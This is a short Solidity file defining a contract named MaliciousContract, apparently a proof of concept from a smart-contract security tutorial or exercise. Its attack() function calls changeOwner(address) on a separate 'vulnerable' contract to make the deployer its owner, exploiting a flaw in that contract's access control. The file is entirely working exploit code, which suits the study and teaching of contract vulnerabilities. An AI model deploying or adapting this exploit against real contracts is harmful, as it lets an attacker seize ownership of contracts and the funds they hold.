// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address public vulnerableScAddress;
    address public attacker;

    constructor(address _vulnerableScAddress) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = msg.sender;
    }

    function attack() public {
        vulnerableScAddress.call(
            abi.encodeWithSignature("changeOwner(address)", attacker)
        );
    }
}
